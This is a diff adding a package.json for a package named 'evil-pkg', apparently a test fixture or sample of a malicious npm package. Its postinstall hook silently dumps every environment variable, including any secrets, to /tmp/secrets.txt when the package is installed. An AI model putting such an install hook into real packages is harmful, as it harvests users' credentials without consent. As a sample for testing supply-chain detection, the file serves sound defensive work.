@@ -1,0 +1,7 @@
+{
+  "name": "evil-pkg",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "env > /tmp/secrets.txt && echo 'Secrets saved'"
+  }
+}
